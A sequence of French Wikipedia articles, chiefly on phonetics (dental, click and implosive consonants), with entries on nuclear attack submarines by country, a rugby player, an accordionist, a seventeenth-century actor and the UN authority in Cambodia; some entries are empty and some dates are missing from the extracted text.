<doc id="568507" url="https://fr.wikipedia.org/wiki?curid=568507" title="Consonne spirante dentale voisée">
Consonne spirante dentale voisée

La consonne spirante dentale voisée est un son consonantique existant dans certaines langues parlées. Le symbole dans l'alphabet phonétique international est , composé du symbole pour une consonne fricative dentale voisée avec un diacritique taquet bas d’abaissement.
Le symbole API sans diacritique peut être utilisé lorsqu’il n’y a pas d’ambigüité. Le symbole avec un ogonek a été utilisé avant la révision de l’alphabet phonétique international de 1989 utilisant plutôt le taquet bas pour indiquer l’abaissement ou l’ouverture.
Certains auteurs, dont , André Martinet ou Jean-Marie Pierret ont utilisé le delta (ou ) pour représenter la consonne spirante avec un symbole distinct de celui de la consonne fricative.
Caractéristiques.
Voici les caractéristiques de la consonne spirante dentale voisée :
En français.
Le français ne possède pas le [ð̞].
Autres langues.
En espagnol, la lettre d se prononce [ð̞] lorsqu'elle est entourée de deux voyelles : todo ['t̪o̞ð̞o̞]

</doc>
<doc id="568508" url="https://fr.wikipedia.org/wiki?curid=568508" title="Équipe de France de football en 2003">
Équipe de France de football en 2003

Cet article traite de l'année 2003 de l'Équipe de France de football.
Après sa calamiteuse campagne 2002, l'équipe de France retrouve des couleurs en 2003. Les Bleus remportent chez eux leur deuxième Coupe des confédérations, se qualifient facilement pour l'Euro 2004 et terminent l'année en apothéose en infligeant une leçon de football à l'Allemagne chez elle. Seule fausse note dans ce remarquable bilan, la défaite sans appel subie à domicile en début d'année contre les Tchèques.
Les matches.
A : match amical. CC : match de la Coupe des confédérations 2003. QCE : match qualificatif pour l'Euro 2004

</doc>
<doc id="568509" url="https://fr.wikipedia.org/wiki?curid=568509" title="Consonne occlusive dentale voisée">
Consonne occlusive dentale voisée

La consonne occlusive dentale voisée est un son consonantique présent dans certaines langues.
Son symbole dans l'alphabet phonétique international est , un "D" minuscule, mais celui-ci peut aussi représenter une consonne occlusive alvéolaire voisée ; la dentale et l’alvéolaire peuvent être distinguées en utilisant avec le signe diacritique indiquant l’articulation dentale et , sans signe diacritique, ou , avec le signe diacritique des extensions de l’alphabet phonétique international, pour l’articulation alvéolaire.
Selon les langues, il peut être plein , aspiré , etc.
Caractéristiques.
Voici les caractéristiques de la consonne occlusive dentale voisée :
Langues.
La consonne occlusive dentale voisée est un son assez courant :

</doc>
<doc id="568512" url="https://fr.wikipedia.org/wiki?curid=568512" title="Janvier 2006 en Afrique">
Janvier 2006 en Afrique



</doc>
<doc id="568513" url="https://fr.wikipedia.org/wiki?curid=568513" title="Consonne roulée dentale voisée">
Consonne roulée dentale voisée

La consonne roulée dentale voisée est un son consonantique présent dans certaines langues. Le symbole dans l'alphabet phonétique international est , composé du symbole pour une consonne roulée alvéolaire voisée, diacrité par le symbole indiquant une dentale.
Caractéristiques.
Voici les caractéristiques de la consonne roulée dentale voisée :
En français.
Le français ne possède pas le [r̪].
Autres langues.
Le marshallais utilise ce son : [ebɑr̪on̪] (Ebadon).

</doc>
<doc id="568514" url="https://fr.wikipedia.org/wiki?curid=568514" title="Consonne battue dentale voisée">
Consonne battue dentale voisée

La consonne battue dentale voisée est un son consonantique présent dans certaines langues. Le symbole dans l'alphabet phonétique international est , composé du symbole pour une consonne battue alvéolaire voisée, diacrité par le symbole indiquant une dentale.
Caractéristiques.
Voici les caractéristiques de la consonne battue dentale voisée :

</doc>
<doc id="568515" url="https://fr.wikipedia.org/wiki?curid=568515" title="Jean-Luc Sadourny">
Jean-Luc Sadourny

Jean-Luc Sadourny (dit "la Vieille") est un joueur de rugby à XV, né le à Toulouse, de pour qui a fait toute sa carrière à Colomiers. Il fut sélectionné à 71 reprises en équipe de France, de 1991 à 2001, inamovible arrière du XV de France, succédant sans heurt à Serge Blanco.
Biographie.
Formé à l'US Colomiers, il y effectue toute sa carrière de joueur, évoluant 21 saisons en équipe première.
Encore junior crabos, il dispute son premier match en équipe fanion en 1984 contre Vic-en-Bigorre en groupe B.
Il participe ensuite à la montée en puissance de son club qui monte en groupe A en 1989 avant de remporter le Challenge européen en 1998 et de disputer la finale de la coupe d'Europe en 1999 et du Championnat de France en 2000.
Il est l'auteur en 1994 contre la Nouvelle-Zélande de ce qui fut qualifié d'« essai du siècle » ou « essai du bout du monde » par de nombreux observateurs.
Après sa retraite de joueur, il devient entraîneur, d'abord à Colomiers puis à Blagnac et à Saint-Gaudens.
En 2010, Jean-Luc Sadourny a créé son restaurant le "Sadourny Café" à Colomiers.
Carrière de joueur.
En club.
Le , il joue avec l'US Colomiers la finale de la Coupe d'Europe au Lansdowne Road de Dublin face à l'Ulster mais les Columérins s'inclinent 21 à 6 face aux Irlandais.
Avec les Barbarians.
En , il est sélectionné avec les Barbarians français pour jouer le Pays de Galles au Millennium Stadium de Cardiff. Il est le capitaine de l'équipe à l'occasion de ce match. Les "Baa-Baas" s'inclinent 40 à 33. En , il connaît une dernière sélection avec les Barbarians français contre la Nouvelle-Zélande au Stade Bollaert à Lens. Les "Baa-Baas" parviennent à s'imposer 23 à 21.

</doc>
<doc id="568516" url="https://fr.wikipedia.org/wiki?curid=568516" title="Consonne spirante latérale dentale voisée">
Consonne spirante latérale dentale voisée

La consonne spirante latérale dentale voisée est un son consonantique présent dans certaines langues. Le symbole dans l'alphabet phonétique international est , composé du symbole pour une consonne spirante latérale alvéolaire voisée, diacrité par le symbole indiquant une dentale.
Caractéristiques.
Voici les caractéristiques de la consonne spirante latérale dentale voisée :
En français.
Le français ne possède pas le son .
Dans les autres langues.
On la trouve en hongrois et en espagnol.

</doc>
<doc id="568517" url="https://fr.wikipedia.org/wiki?curid=568517" title="Février 2006 en Afrique">
Février 2006 en Afrique



</doc>
<doc id="568519" url="https://fr.wikipedia.org/wiki?curid=568519" title="Brécourt">
Brécourt

Guillaume Marcoureau, dit Brécourt, né à Paris (paroisse Saint-Gervais) le et mort à Paris le , est un acteur et auteur dramatique français.
Biographie.
Fils du comédien Pierre Marcoureau, dit Beaulieu, et de la comédienne Marie Boulanger, il débute avec ses parents, vers 1650, dans la troupe de Philandre, sous le nom de « petit Beaulieu ». Peu de temps après il prend le pseudonyme de Brécourt, du nom de l'ancien hôtel de Brécourt, que son père possédait en indivision à Paris.
Le , il épouse une fille de comédiens, Étiennette Des Urlis (1629-1713). Il joue au théâtre du Marais puis entre dans la troupe de Molière qu'il quitte en 1664 pour l'Hôtel de Bourgogne ; l'illustration ci-dessus le montre en frontispice de la publication en 1666 de "Nopce de village" (gravure de Jean Lepautre, détail, non publiée depuis 1682). Il est vraisemblable qu'il créa cette pièce au Palais-Royal deux ans plus tôt, avant de rejoindre la troupe des « Bourguignons ».
Après quelques brefs passages à Paris, il séjourne à Londres où il fait représenter un "Ballet et musique pour le divertissement du Roy de la Grande-Bretagne" en 1674. Brécourt dirige ensuite la troupe du prince d'Orange qui joue à La Haye en 1680 et 1681. De retour à Paris, il entre à la Comédie-Française en 1682 et meurt en 1685, après avoir renoncé à sa profession de comédien.
Brécourt se distingua surtout dans la comédie, pour l'emploi des rôles à manteaux. Louis XIV disait qu’« il pourrait faire rire des fagots ».
Ses pièces sont des comédies en vers, fort médiocres et qui n'obtinrent quelque succès que par le jeu de l’auteur.
En 1685 à Paris, à l'article de la mort, il a renoncé à son métier d'acteur dans le contexte historique de l'excommunication des acteurs. Il témoigne qu'il « a reconnu qu'ayant ci-devant fait la profession de comédien, il y renonce entièrement et promet d'un cœur véritable et sincère de ne la plus exercer ny monter sur le théâtre, quoyqu'il revînt dans une pleine et entière santé ».
Brécourt mourut à la suite d’un effort qu’il fit en jouant une de ses propres comédies, "Timon".

</doc>
<doc id="568520" url="https://fr.wikipedia.org/wiki?curid=568520" title="Mars 2006 en Afrique">
Mars 2006 en Afrique



</doc>
<doc id="568521" url="https://fr.wikipedia.org/wiki?curid=568521" title="Aimable (accordéoniste)">
Aimable (accordéoniste)

Aimable Pluchart dit Aimable, né le à Trith-Saint-Léger dans le département du Nord et mort le à Villemoisson-sur-Orge dans l'Essonne, est un accordéoniste et acteur français.
Surnommé le "bottin mondial" de la chanson en enregistrant plus de , il est le seul accordéoniste français à faire le Ed Sullivan Show.
Il fit partie, avec Joss Baselli, André Lips, Jean Cardon et Maurice Larcange, de la génération d'accordéonistes de l'entre-deux-guerres originaire du nord de la France.
Biographie.
Aimable Pluchart naît à Trith-Saint-Léger le . Il est le fils de Louis Alexandre Pluchart (1897-1980) et d'Angèle Augusta Rooms (1897-1981) sa mère. Son père travaille à la mine et encourage son fils à entrer, à l'âge de sept ans, dans la fanfare du village comme trompettiste. Mais, ayant des lèvres trop fragiles, Aimable opte pour le saxophone soprano.
Un accordéoniste jouant d'oreille l'initie à son instrument en collant des timbres-poste de différentes couleurs sur les touches du clavier. Au bout d'un an d'étude de l'instrument, Émile Larchanché, père de Maurice Larcange, devient son professeur et reprend les choses en main. La méthode d'enseignement de Larchanché donne des résultats qui ne tardent pas à se faire sentir. À l'âge de , Aimable accompagné par son père à la batterie, se produit dans une brasserie. Il doit aussi apprendre le métier d'ajusteur, tout en travaillant son instrument.
Le jour de ses , le , les Allemands envahissent la Belgique. Aimable fuit à vélo vers Paris, où il trouve et partage une chambre avec deux étudiants des Arts et Métiers. Il fait la quête sur les marches du Sacré-Cœur, au cabaret "Chez Ma Cousine", place du Tertre, ou encore au "Poulailler". Il joue les succès du moment, puis trouve un boulot de vernisseur de piano et, par la suite, se fait engager au cabaret le "Tonneau", sur les Grands Boulevards. Le soir, le patron, satisfait, l'invite à revenir le lendemain. Il lui propose de trouver un deuxième musicien, en l'occurrence un banjo ; par la suite viennent s'ajouter un batteur puis un saxophoniste : le premier orchestre d'Aimable vient de naître.
En 1942, sa popularité grandissante l'entraîne au "Floréal", où se retrouvent tous les musiciens de jazz. Il y rencontre ainsi des vedettes comme Albert Nicholas, André Persiani, Django Reinhardt, etc. Les improvisations sur les thèmes de Louis Armstrong, Duke Ellington… lui donnent rapidement l'idée d'apprendre les rythmes de jazz, mais il restera attaché au genre musette.
Il s'engage en 1944 dans la . Avec son accordéon, il est engagé par un orchestre philippin, dans lequel il est le seul Occidental du groupe. Il joue pendant cinq années en Indochine, en Inde, à Singapour, à Hong Kong, à Ceylan… Après quoi, ayant acquis une solide technique, il est de retour en France.
En 1949, il suit le Tour de France, puis part en tournées et visite l'Amérique, l'Égypte, l'Irak, les Philippines et l'Afrique. Contacté par le représentant en France du Stade breton de New York, il accepte d'animer au du Mannhatan Center le bal annuel de l'association, accompagné par les musiciens de Benny Goodman, c'est un succès. Cette soirée présidée par Michel Legendre, consul général de France à New York, réunit . Plus tard, il anime une soirée dans les salons du consulat de France. Il participe au "Show".
Il est marqué par sa soirée au "River Boat", cabaret de l'Empire State Building, avec le trompettiste de jazz Harry James. C'est Aimable qui assure, en "re-recording", l'accompagnement des deux chansons "À nœud coulant" et "Le Règlement" chantées par Louis-Ferdinand Céline et enregistrées antérieurement.
En France, il enregistre fidèlement toutes ses oeuvres aux studios de la firme Vogue à Villetaneuse, qui annonce publiquement le chiffre de de disques. Il obtient, en 1953 et en 1956, la consécration de l'Académie Charles-Cros et celle du Grand prix du disque français. Il se dit dans le milieu des accordéonistes qu'il a « usé » dont Crosio. Parmi ses musiciens, on compte le trompettiste Bertrand Dujardin (1947-2024).
Sa production dépasse les , dont des collaborations, "L'Italienne à Paris", "Si tu veux pardonner", "Madison City" et "Sans respirer" avec Maurice Larcange, "L'Âme des accordéons", "Calamar", "Musette boy", "Vive les mineurs", "Bidule-musette", "Escapade", "Quand tu reviendras" avec André Verchuren. En 1963, il collabore avec Eddie Barclay à la réalisation d'un disque de l'accordéoniste "Lulu Charleu".
Il meurt d'une crise cardiaque le à Villemoisson-sur-Orge (Essonne), où il est inhumé. Il avait épousé Odette Citon (1924-2023).

</doc>
<doc id="568522" url="https://fr.wikipedia.org/wiki?curid=568522" title="Consonne occlusive injective alvéolaire voisée">
Consonne occlusive injective alvéolaire voisée

La consonne occlusive injective alvéolaire est un son consonantique existant dans certaines langues. Le symbole dans l'alphabet phonétique international est .
Caractéristiques.
Voici les caractéristiques de la consonne occlusive injective alvéolaire :

</doc>
<doc id="568523" url="https://fr.wikipedia.org/wiki?curid=568523" title="Avril 2006 en Afrique">
Avril 2006 en Afrique



</doc>
<doc id="568525" url="https://fr.wikipedia.org/wiki?curid=568525" title="Mai 2006 en Afrique">
Mai 2006 en Afrique



</doc>
<doc id="568526" url="https://fr.wikipedia.org/wiki?curid=568526" title="Juin 2006 en Afrique">
Juin 2006 en Afrique



</doc>
<doc id="568527" url="https://fr.wikipedia.org/wiki?curid=568527" title="Juillet 2006 en Afrique">
Juillet 2006 en Afrique



</doc>
<doc id="568528" url="https://fr.wikipedia.org/wiki?curid=568528" title="Août 2006 en Afrique">
Août 2006 en Afrique



</doc>
<doc id="568531" url="https://fr.wikipedia.org/wiki?curid=568531" title="Septembre 2006 en Afrique">
Septembre 2006 en Afrique



</doc>
<doc id="568533" url="https://fr.wikipedia.org/wiki?curid=568533" title="Consonne non pulmonique">
Consonne non pulmonique



</doc>
<doc id="568536" url="https://fr.wikipedia.org/wiki?curid=568536" title="Ezkaratze">
Ezkaratze

Lezkaratze est la pièce de travail centrale de la maison basque de type agricole. S'ouvrant dans le pignon-façade par une large porte charretière à trois vantaux, elle a d'abord abrité une aire en terre battue où l'on dépiquait le grain. Elle est aussi la pièce de distribution, donnant accès aux pièces d'habitation comme d'exploitation. Dispensant de couloir, elle permet de se rendre à la cuisine, aux chambres (généralement au sud), à l'étable au fond ou au nord. Sur un côté, un escalier donne accès au fenil.
L"ezkaratze" se retrouve dans les maisons de Chalosse sous le nom de "sòu" (« sol »). Dans les maisons des Landes de Gascogne, dans le Sud-Ouest de la France, cette pièce évolue en « grande cuisine » (séjour) ouverte sur l'auvent et desservant de la même façon les autres pièces.
Étymologie.
Le terme a une variante : "eskatz".

</doc>
<doc id="568537" url="https://fr.wikipedia.org/wiki?curid=568537" title="Clic bilabial">
Clic bilabial

Les clics bilabiaux sont une famille de consonnes à clic que l'on trouve uniquement dans les langues tuu d'Afrique australe, et dans le langage rituel d'une tribu aborigène d'Australie.
Le symbole dans l'alphabet phonétique international représentant l'articulation antérieure de ces sons est . Il doit être combiné à un second symbole représentant l'articulation postérieure pour figurer un son réel de la parole. Les clics bilabiaux attestés comprennent :
Le " possède également un clic égressif bilabial , le seul attesté au monde.
Le tchip est également considéré comme un clic bilabial.
Caractéristiques.
Voici les caractéristiques d'une consonne à clic bilabiale :
Le son des consonnes à clic bilabiales est parfois décrit de façon erronée comme celui d'un baiser : les lèvres étant placées comme pour un [p] (ce ne sont pas des consonnes labialisées), leur son est plus proche d'un claquement de lèvres.

</doc>
<doc id="568538" url="https://fr.wikipedia.org/wiki?curid=568538" title="Clic dental">
Clic dental

Les clics dentaux sont une famille de consonnes à clic que l'on trouve uniquement en Afrique, ainsi que dans le langage rituel d'une tribu aborigène d'Australie.
Le symbole dans l'alphabet phonétique international représentant l'articulation antérieure de ces sons est ; un symbole désuet en est . Il doit être combiné à un second symbole représentant l'articulation postérieure pour figurer un son réel de la parole. Les clics dentaux attestés comprennent :
Caractéristiques.
Voici les caractéristiques d'une consonne à clic dental :
Langues.
Les clics dentaux sont courants dans les langues khoïsan, dans les langues voisines nguni, comme le zoulou et le xhosa, ainsi que dans une langue couchitique, le dahalo.

</doc>
<doc id="568540" url="https://fr.wikipedia.org/wiki?curid=568540" title="Octobre 2006 en Afrique">
Octobre 2006 en Afrique



</doc>
<doc id="568541" url="https://fr.wikipedia.org/wiki?curid=568541" title="Clic post-alvéolaire">
Clic post-alvéolaire

Les clics post-alvéolaires sont une famille de consonnes à clic que l'on trouve uniquement en Afrique, ainsi que dans le langage rituel d'une tribu aborigène d'Australie.
Le symbole dans l'alphabet phonétique international représentant l'articulation antérieure de ces sons est la lettre point d’exclamation . Il doit être combiné à un second symbole représentant l'articulation postérieure pour figurer un son réel de la parole. Les clics post-alvéolaires attestés comprennent :
Le symbole ressemble à un point d'exclamation, mais ce n'en est pas un : il s'agit en fait du symbole du clic dental avec un point souscrit, l'ancien diacritique pour les consonnes rétroflexes.
Caractéristiques.
Voici les caractéristiques d'une consonne à clic post-alvéolaire :
Langues.
Les clics post-alvéolaires sont courants dans les langues khoïsan, dans les langues voisines nguni, comme le zoulou et le xhosa, ainsi que dans la langue tanzanienne hadza.
En hadza, ils sont fréquemment battus, la face inférieure de la langue frappant le plancher de la bouche après libération du clic (percussive sublinguale, marquée [¡]).

</doc>
<doc id="568542" url="https://fr.wikipedia.org/wiki?curid=568542" title="Clic alvéolo-palatal">
Clic alvéolo-palatal

Les clics alvéolo-palataux, plus couramment appelés clics palataux sont une famille de consonnes à clic que l'on trouve uniquement en Afrique.
Le symbole dans l'alphabet phonétique international représentant l'articulation antérieure de ces sons est . Il doit être combiné à un second symbole représentant l'articulation postérieure pour figurer un son réel de la parole. Les clics alvéolo-palataux attestés comprennent :
Caractéristiques.
Voici les caractéristiques d'une consonne à clic alvéolo-palatale :

</doc>
<doc id="568544" url="https://fr.wikipedia.org/wiki?curid=568544" title="Clic alvéolaire latéral">
Clic alvéolaire latéral

Les clics alvéolaires latéraux sont une famille de consonnes à clic que l'on trouve uniquement en Afrique.
Le symbole dans l'alphabet phonétique international représentant l'articulation antérieure de ces sons est . Il doit être combiné à un second symbole représentant l'articulation postérieure pour figurer un son réel de la parole. Les clics alvéolaires latéraux attestés comprennent :
Caractéristiques.
Voici les caractéristiques d'une consonne à clic alvéolo-palatale :
Langues.
Le Zoulou utilise ce phonème. Il est représenté par la lettre x.
Ex : "Umbhoxo" (rugby).

</doc>
<doc id="568546" url="https://fr.wikipedia.org/wiki?curid=568546" title="Consonne occlusive injective bilabiale">
Consonne occlusive injective bilabiale



</doc>
<doc id="568548" url="https://fr.wikipedia.org/wiki?curid=568548" title="Consonne occlusive injective palatale voisée">
Consonne occlusive injective palatale voisée

La consonne occlusive injective palatale est un son consonantique existant dans certaines langues. Le symbole dans l'alphabet phonétique international est .
Caractéristiques.
Voici les caractéristiques de la consonne occlusive injective palatale :
Langues.
Le français ne possède pas le .

</doc>
<doc id="568549" url="https://fr.wikipedia.org/wiki?curid=568549" title="Novembre 2006 en Afrique">
Novembre 2006 en Afrique



</doc>
<doc id="568550" url="https://fr.wikipedia.org/wiki?curid=568550" title="Consonne occlusive injective vélaire voisée">
Consonne occlusive injective vélaire voisée

La consonne occlusive injective vélaire est un son consonantique existant dans certaines langues. Le symbole dans l'alphabet phonétique international est .
Caractéristiques.
Voici les caractéristiques de la consonne occlusive injective vélaire :
En français.
Le français ne possède pas le .

</doc>
<doc id="568552" url="https://fr.wikipedia.org/wiki?curid=568552" title="Sous-marin nucléaire d'attaque">
Sous-marin nucléaire d'attaque

Les sous-marins nucléaires d'attaque (abrégés en SNA en français et SSN pour « "Ship Submersible Nuclear" » selon le code OTAN) sont des sous-marins à propulsion nucléaire. Contrairement aux SNLE qui ont pour seule mission la dissuasion nucléaire, les SNA sont destinés à des missions de protection, de renseignement et de projection de puissance.
Le premier de ce type de navires de guerre fut l' de l'US Navy qui entra en service en 1955.
Avantages par rapport aux sous-marins classiques.
Les sous-marins d'attaque classiques (désignés dans le code OTAN par le code SSK) sont également conçus pour ces missions. La propulsion nucléaire, totalement indépendante de l'atmosphère, apporte aux SNA un avantage déterminant en mobilité et en discrétion :
SNA par pays.
Voir article connexe pour opérationnel
Chine.
La marine chinoise a mis en service son premier SNA en août 1974, retiré aux alentours de 2000, celui-ci a été transformé en 2016 en navire-musée. Cinq de ses navires du (Code OTAN : Classe Han) ont été lancés entre 1970 et 1990. Basés à Qingdao, ils commencent, dans les années 2000, à être relevés par les navires (Classe Shang) dont le premier est entré en service en construit à six unités puis par les qui doivent entrer en service dans les années 2020.
États-Unis.
L'United States Navy a été la première marine à utiliser la propulsion nucléaire navale. Dans la seconde moitié des années 1980, elle a aligné jusqu'à une centaine de SNA. Avec le retrait en 1990 du dernier exemplaire de sous-marin conventionnel de la classe Barbel, tous ses sous-marins de combat sont à propulsion nucléaire. Avec la disparition de la marine soviétique, elle dispose, de loin, de la plus importante flotte de sous-marins nucléaire d'attaque avec 50 SNA en , chiffres en nette baisse depuis la fin de la guerre froide avec un record de 96 SNA en 1987 et le retrait des premières classes de SNA.
Elle dispose à cette date de :
France.
Six SNA de classe Rubis sont entrés en service dans la Marine nationale entre 1983 et 1993. Ils sont basés dans le port militaire de Toulon. Les SNLE étant basés à celui de Brest, à l'île Longue. Les Rubis sont la seule classe de sous-marins d'attaque actuellement en service depuis le retrait des derniers sous-marins à propulsion classique en 2001. L’escadrille des sous-marins d’attaque (ESNA) dépend de la Force océanique stratégique qui a assimilé les forces sous-marines à la fin du .
En 2023, trois sous-marins classe Rubis restent en service, l'Émeraude, l'Améthyste et la Perle.
Un programme de remplacement par six SNA du Programme Barracuda (classe Suffren) a démarré le . Le premier bâtiment, le "Suffren" est lancé le en 2019. D'une longueur de 99 mètres et d'un diamètre de 8,8 mètres, il est armé de missiles de croisière navals, de torpilles lourdes filoguidées F21, de missiles antinavire Exocet SM39 modernisé et de capacité de mouillage de mines. Sa propulsion est hybride : un réacteur à eau pressurisée dérivé des chaufferies équipant les SNLE type Le Triomphant et le porte-avions Charles de Gaulle, deux turbines de propulsion, deux turbo alternateurs et deux moteurs électriques. Son immersion maximale est confidentielle mais peut dépasser 300 mètres de profondeur. Son équipage est de 65 personnes, plus commandos, et sa disponibilité est supérieure à 270 jours par an. Le 3 juin 2022 à Brest, le "Suffren" entre officiellement au service actif.
Le second le Duguay-Trouin est livré en 2023.
Le troisième Le Tourville est livré fin 2024, il précède les trois derniers prévus pour cette décennie, le De Grasse en 2026, le Rubis en 2027 et le Casabianca en 2029.
Inde.
Entre 1988 et 1990, l'Inde a loué à la marine soviétique le sous-marin nucléaire lanceur de missiles de croisière de K-43 sous le nom INS "Chakra".
Le , la marine indienne a inauguré son premier sous-marin nucléaire fabriqué localement. Le nom du sous-marin connu auparavant sous le nom de code "Advanced Technology Vessel" est "Arihant" ce qui signifie « Destructeur d'ennemis ». Bien que dérivé d'un SNA soviétique, il est classé comme SNLE car pouvant emporter de quatre à douze missiles balistiques à charge nucléaire.
En 2012, l'Inde loue pour dix ans, un exemplaire de la (russe), le "K-152 Nerpa" également sous le nom de INS "Chakra" pour un montant de 920 millions de dollars. Il retourne en Russie en mai 2021. Un troisième sous-marin serait loué à partir de 2025.
Royaume-Uni.
Le premier SNA de la Royal Navy fut le mis sur cale en 1959 et entré en service en 1963. Le Royaume-Uni devient ainsi le troisième pays à mettre en œuvre la propulsion nucléaire.
Lors de la guerre des Malouines, l'un des trois SNA dépêchés sur zone, le , a effectué le premier et l’unique torpillage réalisé par un SNA en envoyant par le fond le croiseur argentin.
En 1990, 17 SNA sont en service, mais leur nombre après la fin de la guerre froide décroît rapidement.
En 2009, la Royal Navy dispose de huit SNA. Un de la classe Swiftsure, en service jusqu'en 2010, et sept SNA de la , mis en service de 1983 à 1991. Fin 2015, sa flotte comporte sept unités, quatre Trafalgar et trois Astute. À terme tous ces sous-marins devraient être remplacés par sept sous-marins de la classe Astute dont le premier exemplaire a été lancé en 2010.
URSS / Russie.
Le complexe militaro-industriel soviétique a construit la plus grande flotte de sous-marins nucléaire de l'Histoire durant la Guerre froide.
Au , la marine soviétique disposait d'un total de 371 sous-marins dont 76 SNA et 49 SSGN, les sous-marins nucléaires étant construits sur 4 chantiers navals.
La Russie dispose en 2010 d'une flotte de 18 SNA dont seulement huit sont opérationnels.
Elle se compose de huit Akula, deux autres se trouvant en réserve, sept SNA de la et de trois SNA de la Classe Victor.
génération.
Le SNA soviétique "K-3" de la est construit par le chantier naval Sevmash de Severodvinsk, lancé le , et déclaré opérationnel le .
Projets de SNA.
Plusieurs nations ont tenté ou tentent d'avoir des sous-marins nucléaires dans leur marine militaire.
Argentine.
En , le général Nicolaides, nommé chef d'état-major après la Guerre des Malouines, s'était prononcé pour l'acquisition d'un sous-marin nucléaire à cause du rôle déterminant joué par ce système d'arme dans la défaite argentine. Dans l'opinion, la nécessité de disposer d'un tel bâtiment demeure pour pouvoir conquérir les Malouines. Le , le ministre de la défense argentin, Nilda Garré, annonce un projet d’équipement de bâtiments de la marine avec un système de propulsion nucléaire. On spécule alors que le sous-marin de la classe TR 1700 pourrait être équipé d'un réacteur nucléaire à la fin des années 2010.
Australie.
Le , le gouvernement australien a annoncé vouloir mettre en œuvre des sous-marins nucléaires dans le cadre d'un nouveau pacte avec les États-Unis et le Royaume-Uni nommé AUKUS. L'effectif devrait être de 8 SNA dotés de systèmes de propulsion nucléaire de technologie américaine.
Brésil.
La marine brésilienne a décidé de se lancer dans ce domaine en 1979. En , elle nomme un organisme de coordination générale pour son programme de développement de sous-marin nucléaire.
Le "plan d'équipement et d'articulation de la marine brésilienne" décidé en 2010 prévoit entre autres la construction de 6 SNA d'ici 2047. Ce programme se nomme SN-BR.
La conception du premier d'entre eux nommé Álvaro Alberto débute le , il est alors prévu que celle-ci devrait se terminer en 2015, que la construction commence en 2016 à Itaguaí, pour se terminer en 2023, avec les essais à quai puis en mer. Le sous-marin devant alors entrer en service actif en 2025.
Mais, à la suite de restrictions budgétaires, il est décidé fin 2015, bien que son premier moteur construit par Jeumont-Schneider ait été livré en que sa construction soit reportée à 2025. Il subit de nouveaux retards et fin 2020, il ne verra pas sa production débuter avant 2022 et les suivants (quatre prévus en 2020) ne seront probablement pas commandés avant 2023/2024. La mise en service de l"Álvaro Alberto" n’étant pas prévue avant 2033/2034. La marine brésilienne a approuvé la construction de SN-BR le 25 novembre 2021.
Les caractéristiques ont évolué avec le temps pour l"Álvaro Alberto". À l'origine la marine brésilienne annonce un déplacement de , une longueur de , un équipage de et une profondeur de , en date de 2016, on indique un déplacement de ce qui en fait l'un des plus petits SNA d'attaque au monde équipé d'une chaudière nucléaire électrogène à eau pressurisée RENAP-50 de 48 mégawatts construit au centre expérimental Aramar de Iperó. En 2017, on annonce une longueur de et un équipage de .
Canada.
À la fin des années 1980, le gouvernement canadien, désireux de contrôler le Passage du Nord-Ouest avait envisagé d'acquérir 12 sous-marins nucléaires d'attaque français de la , pour la marine canadienne. Une concurrence sérieuse opposa à cette occasion la France et le Royaume-Uni qui voulait vendre ses sous-marins de type Trafalgar, mais la fin de la guerre froide et les difficultés budgétaires conduiront à l'abandon de ce projet.
Italie.
L'Italie avait envisagé en 1959 de se doter de sous-marins nucléaires d’attaque, mais les États-Unis ne souhaitèrent pas apporter leur aide et le projet fut abandonné. Le premier SNA italien aurait dû s’appeler Guglielmo Marconi. À ce jour, l'Italie n'a aucun sous-marin nucléaire.
Pays-Bas.
Le principe de la construction d'un SNA est annoncé en par les Pays-Bas et un premier crédit d'études est dans le budget de la défense de 1965. En , le ministre de la Défense déclare que son gouvernement s'intéresse au projet de construction de la alors à l'étude en France. Les États-Unis auraient refusé toute aide à ce projet, qui est resté sans suite.
Suède.
La marine suédoise a planché entre 1957 et 1962 sur le projet A-11A de petit sous-marin nucléaire d'attaque. C'était une des trois versions envisagées de la classe Sjöormen qui finalement a une propulsion diesel classique.
Corée du Nord.
En , lors de la réunion du Parti des travailleurs, le dirigeant nord-coréen Kim Jong-un a annoncé que son pays a mené à bien un plan visant à se doter d'un sous-marin nucléaire. « De nouvelles recherches de planification pour un sous-marin nucléaire ont été menées à bien et sont sur le point d'entrer dans le processus d'examen final », a-t-il déclaré. Lors de cette réunion il a également déclaré que « les États-Unis d'Amérique sont le plus grand ennemi de la Corée du Nord ». Il n'a pas précisé s'il s'agit d'un sous-marin nucléaire de type SNA ou de type SNLE.

</doc>
<doc id="568553" url="https://fr.wikipedia.org/wiki?curid=568553" title="Consonne occlusive injective uvulaire">
Consonne occlusive injective uvulaire

La consonne occlusive injective uvulaire est un son consonantique existant dans certaines langues. Le symbole dans l'alphabet phonétique international est .
Caractéristiques.
Voici les caractéristiques de la consonne occlusive injective uvulaire voisée :
En français.
Le français ne possède pas le .

</doc>
<doc id="568554" url="https://fr.wikipedia.org/wiki?curid=568554" title="Consonne occlusive éjective bilabiale">
Consonne occlusive éjective bilabiale

La consonne occlusive éjective bilabiale est un son consonantique existant dans certaines langues. Le symbole dans l'alphabet phonétique international est .
Caractéristiques.
Voici les caractéristiques de la consonne occlusive éjective bilabiale :
En français.
Le français ne possède pas le [pʼ].
Dans les autres langues.
En quechua, /p/ et constituent des phonèmes séparés.
Le lakota et le dakota possèdent aussi ce son.
Cette consonne existe en géorgien, où elle est écrite . // s’oppose à .

</doc>
<doc id="568555" url="https://fr.wikipedia.org/wiki?curid=568555" title="Décembre 2006 en Afrique">
Décembre 2006 en Afrique



</doc>
<doc id="568556" url="https://fr.wikipedia.org/wiki?curid=568556" title="Consonne occlusive éjective alvéolaire">
Consonne occlusive éjective alvéolaire

La consonne occlusive éjective alvéolaire est un son consonantique existant dans certaines langues. Le symbole dans l'alphabet phonétique international est .
Caractéristiques.
Voici les caractéristiques de la consonne occlusive éjective alvéolaire :
En français.
Le français ne comporte pas le [t'].
Dans les autres langues.
Cette consonne existe en géorgien, où elle est écrite . // s’oppose à .

</doc>
<doc id="568557" url="https://fr.wikipedia.org/wiki?curid=568557" title="Autorité provisoire des Nations unies au Cambodge">
Autorité provisoire des Nations unies au Cambodge

L’&lt;dfn&gt;Autorité provisoire des Nations unies au Cambodge&lt;/dfn&gt; (APRONUC) (en anglais : "United Nations Transitional Authority in Cambodia" (UNTAC) ; en khmer : "អាជ្ញាធរអន្តរកាលសហប្រជាជាតិនៅកម្ពុជា") est un État d'Asie du Sud-Est administré par l'Organisation des Nations unies dans le cadre d'une opération de maintien de la paix qui s’est déroulée au Cambodge du au .
Son but était de faire respecter les engagements contractés lors de la signature des accords de paix de Paris du et sa fonction prit officiellement fin le , lorsque, la nouvelle constitution fut adoptée par le parlement cambodgien.
